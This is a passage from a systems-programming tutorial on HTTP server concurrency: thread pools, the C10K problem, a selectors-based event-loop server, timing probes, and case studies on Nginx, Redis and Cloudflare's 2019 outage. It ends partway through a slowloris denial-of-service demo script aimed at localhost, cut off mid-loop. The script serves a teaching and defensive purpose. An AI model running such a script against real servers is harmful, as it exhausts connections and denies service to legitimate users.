**The flip condition.** The moment "many concurrently-open, mostly-idle connections" describes your workload better than "many concurrently-active requests" does — which is true of essentially any modern consumer-facing HTTP service using persistent connections — an architecture that represents an idle connection with a few hundred bytes of state instead of a whole OS thread (concept 5) becomes strictly better on this specific dimension, independent of raw request throughput.

### Case study — the C10K problem: the paper that reframed server design

**What happened.** In 1999, Dan Kegel published "The C10K problem," a widely-read essay (still hosted, in updated form, at kegel.com) that named and systematized something practitioners were independently hitting: servers built as one process or one thread per connection stopped working as soon as concurrent connection counts reached roughly ten thousand, regardless of how much CPU or bandwidth was available — the bottleneck was structural (memory-per-connection, scheduler overhead, context-switch cost — Day 3 §1.5, §1.6) rather than a matter of buying more hardware. The essay surveyed the I/O mechanisms available at the time (`select`, `poll`, and the then-new `/dev/poll` and `epoll` — Day 5 §1.6) and argued, correctly and influentially, that the only way past the wall was an event-driven architecture that represented each connection as a small piece of state rather than a whole OS thread. Nginx (2004), Node.js (2009), and every modern reverse proxy and async framework trace their architectural lineage directly to solving the exact problem this paper named.

**The engineering lesson, tied to this concept.** This section's own measurements are a miniature of exactly the wall Kegel described: ten concurrent `/api/slow` requests already queued visibly against a pool of eight threads. Scale that same arithmetic to ten thousand *mostly-idle, keep-alive* connections (the previous system design's scenario) and you are precisely inside the C10K problem, at the exact numbers the paper's title refers to.

**A second, complementary case study — already written up in full — belongs here rather than being repeated:** Day 3 §1.9 covers the Apache-versus-Nginx architectural fork *as a direct consequence* of the C10K problem — Apache's traditional process/thread-per-connection MPMs versus Nginx's event-driven design, built specifically to answer Kegel's essay, with real primary sources (Nginx's own architecture documentation, Apache's MPM documentation) already cited there. Rather than re-derive that comparison, go there for the full account; the short version is that Nginx's 2004 debut was a direct, explicit answer to this exact case study's paper.

**Primary source.** Dan Kegel, "The C10K problem" (kegel.com/c10k.html, 1999 — periodically updated; the historical framing and the underlying architectural argument are the durable part, the specific tool recommendations have aged and should be read as historical context rather than current advice).

### In production

**Best practices.** Always bound the pool (this section's first system design); size it from measured or estimated `λ × W`, not intuition (Day 3 §1.7); set keep-alive timeouts with this section's idle-thread cost explicitly in mind, not just with concept 2's handshake-avoidance benefit in mind — the two pull in opposite directions and the right value balances them.

**Common mistakes, beginner → senior.** *Beginner:* the unbounded `threading.Thread`-per-connection version, which works perfectly in every test with a handful of clients and fails exactly the way this section's ten-vs-eight-thread test previewed, at a scale beginners rarely test locally. *Intermediate:* sizing a thread pool as if the workload were CPU-bound (pool size ≈ core count) when it's actually I/O-bound waiting on a database or upstream API — Day 3 §1.7 covers exactly why that's wrong by an order of magnitude in the I/O-bound case. *Senior:* correctly bounding the thread pool but forgetting keep-alive means the pool is now sized against *concurrent connections*, not *concurrent requests* — the mistake this section's second system design exists to prevent.

**Observability.** Active-thread count versus pool size (a pool sitting at 100% busy with climbing queue depth is Day 3 §1.7's undersized-pool cliff, arriving); thread count over time system-wide (a monotonic climb with the unbounded variant is a thread leak in slow motion — Day 3 §1.9's exact diagnostic); the fraction of pooled threads currently blocked in `recv()` waiting on an idle keep-alive connection versus actively running `route()` — a high idle fraction is this section's idle-thread tax made visible.

**Scaling behavior and cost.** Thread-per-connection scales linearly in *memory* with concurrent connections (not requests) and is bounded, in practice, well below C10K-scale concurrency on typical hardware — which is entirely adequate for the enormous majority of internal services and moderate-traffic sites, and is exactly why Gunicorn's `sync`/`gthread` workers (concept 7) remain a perfectly reasonable default rather than a mistake.

---

## 5. Concurrency model II — the event loop (`selectors`/`epoll`)

**Depth: [CORE]**

### Intuition

Thread-per-connection's cost, precisely diagnosed in concept 4, comes from representing each connection with a *whole OS thread* — a full stack, a scheduler entry, a context-switch's worth of registers — when most of what that thread is doing, most of the time, is nothing: sitting blocked in `recv()` waiting for bytes that haven't arrived yet. Day 5 §1.6 already built the alternative from first principles: instead of one thread blocking on one socket, register *every* socket with the kernel once (`epoll_ctl`, wrapped by Python's `selectors` module) and have a **single thread** ask the kernel one question, repeatedly — "of everything I'm watching, which of these is actually ready right now?" — via `epoll_wait` (`sel.select()`). The kernel does the waiting; your one thread only wakes up when there's real work, and it wakes up already knowing exactly which sockets have it.

Applying that idea to an HTTP server means confronting something the threaded model let you ignore for free: **you can no longer block.** `handle_client`'s clean `while True: recv_request(); route(); sendall()` loop from concepts 2 and 4 depends entirely on being allowed to call `recv()` and just wait — on a shared single thread serving every connection, one connection blocking in `recv()` would freeze every *other* connection too, which defeats the entire point. The event-loop version has to give up that convenience and instead handle each connection as a **state machine**: read whatever bytes happen to be available right now, remember how much of a request you've accumulated so far, and return control to the loop immediately, trusting that you'll be called again the next time more bytes show up.

### Analogy — the restaurant, one more time

Day 5 §1.6 already built this analogy in full — a waiter with a call-button system instead of one waiter per table — and it isn't repeated here. What's new for an *HTTP* server specifically is the "kitchen" part of that analogy: the waiter (the event loop) is superb at noticing which tables have pressed their button, but **the moment the waiter personally has to cook a slow dish at the table instead of carrying it to the kitchen, every other table's buzzer goes unanswered until that dish is done** — because there's only one waiter, doing everything, including the cooking. **Where this breaks from Day 5's version, specifically:** Day 5's echo server never had a handler slow enough to expose this; today's server does, on purpose (`/api/slow`), because watching this failure mode happen to your own code is the entire teaching point of this section.

### Runnable example — a working event-loop server, including a real bug found while building it

```python
# eventloop_server.py -- ONE thread, many connections, via selectors
# (epoll under the hood on Linux -- Day 5 sec 1.6, reused directly here).
# stdlib only. Run:  python eventloop_server.py
import json, os, selectors, socket, time

HOST, PORT = "127.0.0.1", 8080
STATIC_DIR = os.path.join(os.path.dirname(__file__), "static")
MAX_HEADER_BYTES = 16 * 1024

os.makedirs(STATIC_DIR, exist_ok=True)
with open(os.path.join(STATIC_DIR, "hello.txt"), "w") as f:
    f.write("hello from the static directory\n")

sel = selectors.DefaultSelector()


class Conn:
    """Per-connection state the event loop keeps INSTEAD OF a thread+stack --
    this is the 'a few KB, not a whole thread' side of Day 3 sec 1.6's
    C10K memory comparison, made concrete."""
    __slots__ = ("sock", "addr", "inbuf", "outbuf", "close_after_write")

    def __init__(self, sock, addr):
        self.sock = sock
        self.addr = addr
        self.inbuf = b""
        self.outbuf = b""
        self.close_after_write = False


def try_parse_request(inbuf: bytes):
    """Returns (method, path, version, headers, body, remainder), or None if
    inbuf doesn't yet hold a full request. NEVER calls recv() itself -- only
    inspects bytes already in hand, so it can be called after every partial
    read without blocking anyone."""
    # Check the cap UNCONDITIONALLY, before checking for the terminator. See
    # this section's "honesty in code" callout for the real bug this avoids.
    if len(inbuf) > MAX_HEADER_BYTES:
        raise ValueError("request header too large")
    if b"\r\n\r\n" not in inbuf:
        return None
    head, _, rest = inbuf.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    method, path, version = lines[0].decode("latin-1").split(" ")
    headers = {}
    for line in lines[1:]:
        name, _, value = line.decode("latin-1").partition(":")
        headers[name.strip().lower()] = value.strip()
    content_length = int(headers.get("content-length", 0))
    if len(rest) < content_length:
        return None                          # body not fully arrived yet
    body, remainder = rest[:content_length], rest[content_length:]
    return method, path, version, headers, body, remainder


def build_response(status, reason, body, content_type, keep_alive):
    headers = [
        f"HTTP/1.1 {status} {reason}",
        f"Content-Type: {content_type}",
        f"Content-Length: {len(body)}",
        f"Connection: {'keep-alive' if keep_alive else 'close'}",
    ]
    return ("\r\n".join(headers) + "\r\n\r\n").encode("latin-1") + body


def route(method, path, keep_alive):
    if method == "GET" and path == "/api/time":
        payload = json.dumps({"utc": time.time()}).encode()
        return build_response(200, "OK", payload, "application/json", keep_alive)
    if method == "GET" and path == "/api/slow":
        time.sleep(1.0)              # <-- THE BUG WE'RE ABOUT TO PROVE. See below.
        return build_response(200, "OK", b'{"slept": 1.0}', "application/json", keep_alive)
    if method == "GET" and path.startswith("/static/"):
        requested = os.path.normpath(os.path.join(STATIC_DIR, path[len("/static/"):]))
        if not requested.startswith(os.path.abspath(STATIC_DIR)):
            return build_response(403, "Forbidden", b"forbidden\n", "text/plain", keep_alive)
        if not os.path.isfile(requested):
            return build_response(404, "Not Found", b"not found\n", "text/plain", keep_alive)
        with open(requested, "rb") as f:
            data = f.read()
        return build_response(200, "OK", data, "text/plain", keep_alive)
    return build_response(404, "Not Found", b"not found\n", "text/plain", keep_alive)


def wants_keep_alive(version, headers):
    conn_header = headers.get("connection", "").lower()
    if conn_header == "close":
        return False
    return True if version == "HTTP/1.1" else conn_header == "keep-alive"


def on_readable(conn: Conn):
    try:
        chunk = conn.sock.recv(4096)
    except BlockingIOError:
        return                                # spurious wakeup -- Day 5 sec 1.6
    except (ConnectionResetError, OSError):
        close(conn); return
    if not chunk:
        close(conn); return                   # peer closed (EOF)
    conn.inbuf += chunk
    try:
        parsed = try_parse_request(conn.inbuf)
    except ValueError as exc:
        conn.outbuf += build_response(400, "Bad Request", str(exc).encode(), "text/plain", False)
        conn.close_after_write = True
        sel.modify(conn.sock, selectors.EVENT_WRITE, data=conn)
        return
    if parsed is None:
        return                                # need more bytes -- wait for the next event
    method, path, version, headers, body, remainder = parsed
    conn.inbuf = remainder                    # any pipelined bytes stay buffered
    keep = wants_keep_alive(version, headers)
    conn.outbuf += route(method, path, keep)  # <-- runs INLINE, ON THE EVENT LOOP THREAD
    conn.close_after_write = not keep
    sel.modify(conn.sock, selectors.EVENT_WRITE, data=conn)


def on_writable(conn: Conn):
    try:
        if conn.outbuf:
            sent = conn.sock.send(conn.outbuf)
            conn.outbuf = conn.outbuf[sent:]
    except (ConnectionResetError, BrokenPipeError, OSError):
        close(conn); return          # peer vanished mid-write -- do NOT crash the loop
    if not conn.outbuf:
        if conn.close_after_write:
            close(conn); return
        sel.modify(conn.sock, selectors.EVENT_READ, data=conn)


def close(conn: Conn):
    try:
        sel.unregister(conn.sock)
    except KeyError:
        pass
    conn.sock.close()


def serve_forever():
    lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lsock.bind((HOST, PORT)); lsock.listen(512)
    lsock.setblocking(False)
    sel.register(lsock, selectors.EVENT_READ, data=None)
    print(f"selector: {type(sel).__name__}   event-loop server on http://{HOST}:{PORT}")

    while True:
        for key, mask in sel.select(timeout=1.0):
            if key.data is None:
                try:
                    conn, addr = key.fileobj.accept()
                except OSError:
                    continue          # peer hung up between "readable" and accept()
                conn.setblocking(False)
                sel.register(conn, selectors.EVENT_READ, data=Conn(conn, addr))
            else:
                conn = key.data
                if mask & selectors.EVENT_READ:
                    on_readable(conn)
                elif mask & selectors.EVENT_WRITE:
                    on_writable(conn)


if __name__ == "__main__":
    serve_forever()
```

**Why this works, line by line.**

- `try_parse_request` is `recv_request`'s job (concept 1) with one crucial difference: it never calls `recv()`. It's a pure function of "the bytes I've accumulated so far" that returns either a parsed request or `None` — "not enough yet, ask me again after the next read." Every earlier server's `while b"\r\n\r\n" not in buf: chunk = conn.recv(...)` polling loop becomes, here, a single check performed once per `on_readable` call, with the *loop* itself replaced by the event loop calling `on_readable` again on the next readiness notification. This is the general recipe for turning any blocking read-loop into a non-blocking one: keep the accumulated state (`conn.inbuf`) outside the function, check for completeness on every new chunk, and return control the moment you don't have enough.
- `Conn.__slots__` is what makes Day 3 §1.6's "a few KB, not a whole thread" claim literal — a `Conn` instance is a handful of Python object references, nowhere near an 8MB reserved stack.
- `sel.modify(conn.sock, selectors.EVENT_WRITE, data=conn)` after building a response is how this server tells the *kernel* to stop notifying it about "more data to read" and start notifying it about "the send buffer has room" instead — a connection's registered interest changes as its state machine moves from "waiting for a request" to "waiting to finish sending a response," toggling back to `EVENT_READ` once the send completes (in `on_writable`). A real production event loop typically watches for both simultaneously and reacts to whichever fires; toggling a single interest at a time, as done here, is simpler to reason about and correct for this demo, at the cost of an extra `epoll_ctl`-equivalent call per state transition — a real trade a production implementation would likely make differently.
- `try: conn, addr = key.fileobj.accept() except OSError: continue` guards against exactly the race Day 5 §1.6 names explicitly: between `select()` reporting the listening socket readable and this code calling `accept()`, the pending connection can already be gone (the client hung up before we got to it) — treating that as fatal would be wrong, so it's caught and skipped.

**Honesty in code — a real bug this server had, and how it was found.** While preparing this note, running exactly the concurrency demo below crashed this server outright with an unhandled `ConnectionResetError` inside what is now `on_writable`'s `try` block — a client had already closed its side of the connection by the time the loop got around to calling `conn.sock.send(...)` on it, and with no exception handling around that call, the error propagated straight out of the **only thread this program has**, killing the entire event loop and every connection it was serving, not just the one that triggered it. This is a sharper version of Day 3's crash-isolation trade-off (§1.1's "one cook slipping doesn't level the building; one thread can"): in a threaded server, an unhandled exception in one connection's thread kills *that thread* and nothing else; in a single-threaded event loop, an unhandled exception anywhere is fatal to *everyone*, because there is no second thread left standing to keep serving the rest. The `try/except (ConnectionResetError, BrokenPipeError, OSError)` wrapping `on_writable`'s body above is the fix, added after this crash was reproduced — every callback in a real event loop must be defensively wrapped this way, because a bug that would merely inconvenience one client under thread-per-connection is fatal to the entire server here.

### Runnable example — proving the blocking failure mode, precisely

The comment `# <-- THE BUG WE'RE ABOUT TO PROVE` inside `route()` marks a `time.sleep(1.0)` — a stand-in for any slow, synchronous operation (a blocking database call, a slow file read, a CPU-heavy computation) called directly from inside a handler that runs *on the event loop's one and only thread*. Proving this actually blocks *every other connection*, not just the slow one, needs precise timing that shell-launched `curl` processes can't reliably provide (their own process-startup jitter is large enough to hide or fake the effect) — so this demo uses a small single-process Python driver that sends both requests from known, controlled instants:

```python
# blocking_probe.py -- send a slow and a fast request back-to-back from ONE
# process, so there's no cross-process scheduling jitter to obscure the timing.
import socket, time

HOST, PORT = "127.0.0.1", 8080
t0 = time.perf_counter()

a = socket.create_connection((HOST, PORT))
a.sendall(b"GET /api/slow HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
t_sent_slow = time.perf_counter() - t0

b = socket.create_connection((HOST, PORT))
b.sendall(b"GET /api/time HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
t_sent_time = time.perf_counter() - t0

resp_time = b.recv(4096)                      # read the FAST one first
t_got_time = time.perf_counter() - t0
resp_slow = a.recv(4096)
t_got_slow = time.perf_counter() - t0

print(f"sent /api/slow at t={t_sent_slow:.3f}s")
print(f"sent /api/time at t={t_sent_time:.3f}s")
print(f"got  /api/time reply at t={t_got_time:.3f}s  "
      f"(waited {t_got_time - t_sent_time:.3f}s for a supposedly instant endpoint)")
print(f"got  /api/slow reply at t={t_got_slow:.3f}s")
a.close(); b.close()
```

Real, measured output:

```
$ python blocking_probe.py
sent /api/slow at t=0.006s
sent /api/time at t=0.006s
got  /api/time reply at t=1.007s  (waited 1.001s for a supposedly instant endpoint)
got  /api/slow reply at t=1.007s
```

**Both requests were sent within the same millisecond, and both replies arrived together, a full second later.** `/api/time` does zero real work — building its JSON body takes microseconds — yet it took **1.001 seconds** to get a reply, because by the time its bytes reached the server, the event loop's one thread was already inside `route()`'s `time.sleep(1.0)` for the *other* connection's `/api/slow` request, and nothing else — not `sel.select()`, not any other connection's `on_readable` — can run until that call returns. This is the honest, opposite half of the C10K story concept 4 told: thread-per-connection pays a steep *fixed* cost per idle connection but isolates slow handlers from each other perfectly; the event loop pays almost nothing per idle connection but has *zero* isolation between handlers sharing its one thread. Contrast this precisely with concept 4's threaded measurement, where five *concurrent* one-second `/api/slow` calls finished in 1.389 seconds total, each on its own thread, with zero cross-talk — the identical workload, on the identical routing logic, behaves completely differently depending purely on which of these two concurrency models is running it.

**What the real fix looks like, honestly scoped.** The correct answer is never "don't do slow things" — real servers must read files, query databases, and call upstream APIs. The correct answer is: **the event loop itself must never be the thing that waits.** Two shapes exist for that fix, and naming them precisely matters: either every I/O call in every handler must be a genuinely *non-blocking* one that the loop itself can watch for readiness (this is what a full coroutine-based framework does — `await` a socket read instead of calling `recv()` directly, so control returns to the loop instead of parking the thread — which is exactly Day 21's asyncio and is not re-derived here), or a blocking call must be explicitly handed off to a bounded worker thread pool and the loop notified only when that thread finishes (`concurrent.futures.ThreadPoolExecutor` plus a completion callback, which is precisely what Python's `asyncio.loop.run_in_executor` does, and precisely what a real ASGI server does for any synchronous framework code it has to run — concept 8). Building either fully here would require either re-deriving Day 21's coroutine machinery or a second complete server just to demonstrate an offload pattern that doesn't teach a new mechanism beyond "hand the blocking part to concept 4's thread pool and poll or callback on completion" — so this is named, and left, as a deliberate stop rather than built out in full.

**Deliberate stop.** I'm not building coroutines, `async`/`await`, or a production-grade executor-offload pattern here — that is Day 21's subject in full, and everything above is exactly the motivation Day 21 will assume you already have.

### Visual — the same workload, three architectures, side by side

```
FIVE concurrent 1-second /api/slow requests:

ITERATIVE (concept 1)        one worker, fully serial
  req1 [====1s====]
  req2             [====1s====]
  req3                         [====1s====]
  req4                                     [====1s====]
  req5                                                 [====1s====]
  total: ~5s   (measured: 5.181s)

THREADED, pool=8 (concept 4)  independent workers, fully parallel
  req1 [====1s====]
  req2 [====1s====]
  req3 [====1s====]
  req4 [====1s====]
  req5 [====1s====]
  total: ~1s   (measured: 1.389s)

EVENT LOOP, naive handler (concept 5)   one thread, handler blocks it
  req1 [====1s====]
  req2 [====1s====]  <- NOT actually parallel: this bar only starts
  req3 [====1s====]     drawing (in wall-clock terms) once req1's
  req4 [====1s====]     sleep() returns and the loop is free again
  req5 [====1s====]
  total: ~5s   (same shape as ITERATIVE, for the same reason: one
                worker, handling one blocking call at a time)
```

### Under the hood

Everything below `sel.select()` is exactly Day 5 §1.6: `epoll_create1()` on Linux builds a kernel-held red-black tree of registered descriptors plus a ready-list; `epoll_ctl` (wrapped by `sel.register`/`sel.modify`/`sel.unregister`) adds, changes, or removes entries; `epoll_wait` (wrapped by `sel.select`) sleeps until the ready-list is non-empty, then hands back exactly the ready descriptors — no scanning, O(1) in the number of registered descriptors. None of that changes for an HTTP server versus Day 5's generic echo server; what's new today is purely the *application-level state machine* sitting on top of it — `Conn`, `try_parse_request`, and the read/write interest-toggling — which is the part any HTTP-specific event-driven server (Nginx's worker event loops, Node's libuv-backed request handling, `asyncio`'s transport/protocol layer) has to build regardless of language.

**Deliberate stop.** I'm not re-opening `epoll`'s red-black tree, ready-list callback mechanism, or the level-triggered-vs-edge-triggered distinction — Day 5 §1.6 covers all of that in full and it applies unchanged here.

### System design — one event loop, or many? (Nginx's actual answer)

**Problem.** This section's server runs entirely on one thread. A single Python process is additionally bound by the GIL (Day 20) to one core's worth of *Python* execution even if the OS has sixteen. Nginx faces the identical architectural question and does not answer it with "one process, one event loop" — why not, and what does it do instead?

**Requirements.** Use all available CPU cores; keep the per-connection cost advantages of an event loop (concept 5's whole point) rather than reverting to thread-per-connection; keep the failure-isolation story reasonable (concept 4's crash-isolation concern, and this section's honesty-in-code crash, both matter here too).

**The realistic alternatives.** (1) One process, one event loop, accepting everything — this section's toy server, exactly as built. (2) One process, but multiple OS *threads* each running their own event loop, sharing the listening socket. (3) Nginx's actual, real, documented design: **multiple worker *processes*** (`worker_processes`, commonly set to the core count), each running its own independent, single-threaded event loop, each with its own copy of the listening socket registered via `SO_REUSEPORT` or the older shared-fd approach, with the kernel distributing incoming connections across them.

**The decision, and the actual reason.** Nginx chose (3), separate processes, and the reason is almost entirely about failure isolation rather than performance: a bug, a memory corruption, or exactly this section's honesty-in-code crash (an unhandled exception killing the *entire* single thread it runs on) in one Nginx worker process takes down *that worker's* connections and nothing else — the master process detects the dead worker and respawns it, while every other worker keeps serving traffic uninterrupted. Threads sharing one process (option 2) would multiply the CPU-core utilization the same way, but a single memory-corrupting bug or a crash from an unhandled exception in *any* thread can, depending on the nature of the fault, take the whole process down — reintroducing exactly the "everyone shares your worst bug's blast radius" property that separate processes exist to avoid (a direct callback to Day 2's process-isolation case study and Day 3 §1.1's "no isolation wall between threads" analogy break).

**The trade-off.** Separate processes can't share in-memory state directly — Nginx workers don't share an in-process cache or connection pool with each other the way threads in one process could; anything that must be shared across workers (a rate-limit counter, an upstream connection pool meant to be process-wide) needs shared memory segments or an external store, which is real additional complexity Nginx's configuration system (`shared_dict`-style constructs in some modules, or an external cache like Redis) exists partly to manage.

**The flip condition.** A single event loop (this section's toy server, unmodified) is the right answer whenever total throughput needed fits comfortably within one core's capacity — true for the overwhelming majority of internal tools, low-traffic APIs, and anything still in early development. Multiple worker *processes*, Nginx's model, becomes necessary the moment either (a) you need more raw throughput than one core's single-threaded event loop can provide, or (b) failure isolation between concurrent workers matters enough that you're not willing to let one bad request potentially affect every other in-flight connection — which, per this section's own crash story, is a real and not merely theoretical risk for hand-rolled single-threaded servers.

The official four-workload system design promised at the top of this note belongs here, now that all three concurrency models actually exist to compare:

### System design — matching a concurrency model to the workload

**Problem.** You're the architect for four separate services. For each, pick iterative, thread-per-connection, or an event loop, and justify it against the mechanisms this note has now built and measured directly.

**Service A — a static file server (images, CSS, JS for a website).** Requests are short, almost entirely I/O-bound (reading a file and writing it to a socket), and traffic can be very high-volume with many concurrent, often keep-alive, connections. **Pick: event loop.** The workload is exactly what concept 5 is built for — cheap-per-connection, I/O-bound, high-concurrency — and the one risk this section surfaced (a slow handler blocking everyone) barely applies, since serving a file from disk cache is fast and doesn't hold the loop for long. This is precisely why Nginx, whose origin case study is literally "solve this," is the standard tool for exactly this job.

**Service B — a long-poll chat backend (a client holds a connection open, waiting up to 30 seconds for a new message before the server can reply).** By design, most connections are open and *idle*, waiting, at any given instant — this is concept 4's "idle-thread tax" system design's exact nightmare scenario, deliberately engineered into the product requirement. **Pick: event loop**, decisively. Ten thousand long-poll connections under thread-per-connection is a textbook C10K collapse (concept 4's case study, at exactly the scale the term describes) — each idle, waiting connection would hold a full thread for up to 30 seconds doing nothing. Under an event loop, each idle long-poll connection costs a `Conn` object's worth of memory and nothing else, which is the entire reason chat and real-time-notification backends are built this way in practice.

**Service C — a CPU-heavy image-resizing endpoint (upload an image, the server resizes it, taking 300ms–2s of genuine CPU work per request).** This is the one workload where the event loop's core weakness (concept 5's whole worked example) is directly, unavoidably triggered — image resizing is real, synchronous CPU work with nothing to `await`, so running it inline on an event loop reproduces this section's `/api/slow` disaster exactly, except now it's not artificial. **Pick: thread-per-connection** (or, if the framework is async, an event loop with CPU work explicitly offloaded to a worker pool — concept 5's "what the real fix looks like" paragraph, applied for real this time). The key distinguishing fact from Day 3 §1.7: this workload is **CPU-bound, not I/O-bound**, which flips Day 3's pool-sizing rule — size the pool close to the core count, not to `λ × W`, because more threads than cores just adds scheduling overhead (Day 3 §1.5) without adding parallelism once every core is saturated.

**Service D — a standard CRUD API (read/write a database, JSON in and out, typical request takes 20–100ms, dominated by waiting on the database, not computing).** This is the least dramatic case and, not coincidentally, the most common workload in industry. **Pick: either thread-per-connection with a modest pool, or an event loop with a proper async database driver — both are genuinely fine**, and the deciding factor is usually organizational rather than architectural: which one does your team's framework, ORM, and database driver actually support well? A synchronous ORM (classic Django, older SQLAlchemy usage) pairs naturally with thread-per-connection (Gunicorn's `sync`/`gthread` workers, concept 7); a fully async stack (FastAPI with an async driver) pairs naturally with an event loop. Forcing a synchronous, blocking database driver onto an event-loop server reproduces this section's exact failure mode on every single database call — a mistake common enough that it's this note's single most important warning to carry into Day 21 and beyond.

### Case study — Redis: a single-threaded event loop, on purpose, for a completely different problem

**What happened, and why it's real evidence beyond the web-server case.** Redis, the in-memory data store, has been built around a single-threaded event loop (originally hand-rolled, `epoll`-based on Linux, mirroring exactly the mechanism this section builds) for its core command-processing path since its earliest versions, and its own FAQ and documentation explain the reasoning directly: nearly all Redis operations are so fast (in-memory data structure manipulation, no disk I/O in the hot path) that the overhead of locking and coordinating multiple threads accessing shared data would exceed the benefit of running them in parallel — a single thread processing commands one at a time, with no locks needed at all because there's never more than one thread touching the data, both simplifies the implementation enormously and is, for this specific workload, competitively fast. This demonstrates that concept 5's core mechanism generalizes well beyond HTTP: an event loop is a general answer to "many mostly-fast, mostly-independent units of work arriving concurrently," not a web-server-specific trick.

**The engineering lesson, tied to this concept.** Redis's own operational guidance is the mirror image of this section's `/api/slow` warning: a Redis command that is *not* fast — a poorly chosen `KEYS *` scan over a huge keyspace, a large `SORT`, a Lua script with an expensive loop — blocks that single event loop exactly the way this note's `time.sleep(1.0)` blocks `eventloop_server.py`, and every other client's request queues up behind it. Redis's documentation explicitly warns operators to avoid O(N) operations on large collections in production for exactly this reason; it is the same mechanism, the same warning, in a different product.

**Primary sources.** Redis documentation / FAQ, "Why is Redis single threaded, how can I exploit multiple CPU/cores?"; Redis documentation on the `KEYS` command's production warning. *Verify current: Redis 6+ introduced optional multi-threaded I/O for network read/write (not for command execution, which remains single-threaded) — check the current Redis documentation for exactly which parts of the pipeline are threaded in the version you're using before assuming the "fully single-threaded" description still applies without qualification.*

**A second case study — a failure, this time — the same mechanism at web-request scale:** Cloudflare's July 2, 2019 global outage was caused by a single bad regular expression, deployed as part of a WAF (Web Application Firewall) rule, that triggered catastrophic backtracking (a regex engine's runtime exploding combinatorially on certain input) on ordinary traffic. Cloudflare's own incident report describes the effect precisely in this section's terms: the WAF's rule evaluation ran inline, synchronously, inside Nginx's per-worker event-loop request-processing path — exactly where this section's `route()` function runs inline on the event loop thread — and a CPU-bound computation that should take microseconds instead took seconds, on every worker process, for every request that touched the rule, because the bad regex was deployed globally at once. With every worker's single event-loop thread pegged at 100% CPU running the same runaway regex over and over, Cloudflare's edge network went down worldwide for roughly 30 minutes. *Verify current: exact timings and CPU figures per Cloudflare's own incident report; the core mechanism (a synchronous, CPU-heavy operation run inline on an event-loop worker) is the durable, well-documented lesson.*

**Primary source.** Cloudflare Blog, "Details of the Cloudflare outage on July 2, 2019" (John Graham-Cumming, Cloudflare engineering blog, July 2019).

### In production

**Best practices.** Audit every line that runs inside a request handler for anything that can block — a synchronous database driver, `time.sleep`, a large synchronous computation, even a slow synchronous DNS lookup (Day 12) — and either make it genuinely non-blocking or explicitly offload it to a worker pool (this section's "what the real fix looks like" paragraph). Wrap every event-loop callback in defensive exception handling — this section's own crash is the reason why. Prefer a battle-tested event loop implementation (`asyncio`, `libuv`, Nginx itself) over a hand-rolled one for anything beyond learning, for the same build-vs-buy reasoning as concept 1's parser system design.

**Common mistakes, beginner → senior.** *Beginner:* calling a blocking library function (a synchronous HTTP client, `time.sleep`, an unindexed database query that happens to be slow) directly inside an `async def` handler or an event-loop callback — this section's exact bug, reproduced. *Intermediate:* noticing p99 latency has degraded badly while p50 looks fine and CPU usage looks low, and not immediately recognizing that pattern as "something occasionally blocks the loop" (Day 5 §1.10 names this exact diagnostic signature). *Senior:* deploying a change that is fast in the overwhelming common case but has a catastrophic worst case on adversarial or unusual input (Cloudflare's regex) without load-testing against exactly that worst case before a global rollout — a process failure (staged rollout, worst-case testing) as much as a code failure.

**Observability.** Event-loop lag / scheduling delay (how long a scheduled callback waits before actually running — a rising figure means something is hogging the loop); CPU usage per worker process alongside request latency (Cloudflare's incident is visible in exactly this correlation: CPU pegged, latency collapsed, on every worker simultaneously); the fraction of time the loop spends in `select()`/`epoll_wait()` (idle, healthy) versus inside application code (busy — a healthy event-loop server should spend very little wall-clock time doing anything else).

**Failure modes and recovery.** A single blocking or CPU-heavy handler degrades *every* concurrent connection on that loop simultaneously, not just its own — the blast radius is total for that worker, which is why concept 5's "one event loop or many" system design matters: multiple worker processes bound the blast radius to one worker's share of traffic rather than all of it. An unhandled exception is fatal to the entire loop unless every callback is defensively wrapped — this section's real crash, and its fix.

---

## 6. Timeouts and the slowloris attack

**Depth: [CORE]**

### Intuition

Concept 1's worked example already produced the core insight without any malicious intent: a client that connects and sends nothing holds the iterative server hostage for as long as it feels like, because `recv()` has no built-in notion of "too long." Everything in this section follows from asking the obvious next question: **what if a client does this on purpose, and does it cleverly enough to survive whatever simple defense you put in place first?**

The attack that answers that question is called **slowloris**, and its defining trick is almost elegant: rather than sending *nothing* (which a naive "give up if silent for N seconds" timeout would catch), it sends a *little*, periodically — just enough, just often enough, to keep resetting any timer that only measures "time since the last byte arrived." From the server's point of view, a connection trickling one header line every ten seconds is genuinely indistinguishable, by that measurement alone, from a legitimate client on an extremely slow or congested network connection — which is exactly what makes it hard to defend against by that measurement alone, and exactly why this section ends up needing more than one kind of timeout.

### Analogy — the customer who never finishes ordering

Return to concept 1's ticket-window analogy, now with an adversarial customer: they step up, say "I'd like to place an order, hold on, let me think—", and then, every time the clerk is about to give up and ask the next person, they add one more word to their sentence — "...a..." — just enough to prove they're still "in the middle of" talking, never enough to actually finish the order. A clerk with a rule like "if you go completely silent for ten seconds, I'll move on" is defeated by this customer trivially, because the customer's whole strategy is to never be silent for that long — while contributing essentially nothing.

**Where the analogy breaks:** a human clerk facing this would eventually get suspicious of the *pattern* (one word every ten seconds is not how a real person orders food) and cut the customer off on judgment, even without a formal rule. A `recv()` call and a `socket.settimeout()` have no judgment — they only measure elapsed time since the last byte, and a rule based purely on that measurement is defeated by anything that respects the measurement's letter while violating its spirit. This is exactly why real defenses (below) end up needing an *absolute* deadline in addition to an *idle* one — a rule the analogy's clerk would arrive at instinctively ("you get sixty seconds to place your whole order, full stop, no matter how you pace it") but that a socket timeout has to be built deliberately, because it isn't the default behavior of anything.

### Worked example — reproducing slowloris against the iterative server

RSnake's original attack sends a real, well-formed request *line*, then a stream of syntactically valid but incomplete headers, spaced out, never sending the terminating blank line that would complete the request:

```python
# slowloris_demo.py -- a small, honest reproduction of RSnake's technique:
# open connections, send a PARTIAL request, then trickle one more header
# line every few seconds, forever. Never send the terminating blank line.
# DEMO ONLY -- run this only against a server you own.
import socket, time, sys

HOST, PORT = "127.0.0.1", 8080
N_SOCKETS = int(sys.argv[1]) if len(sys.argv) > 1 else 50
TRICKLE_EVERY = 10          # seconds between keep-it-alive bytes

socks = []
for i in range(N_SOCKETS):
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.send(b"GET /api/time HTTP/1.1\r\n")          # a real, valid request line
    s.send(f"X-a: {i}\r\n".encode())                # one partial header
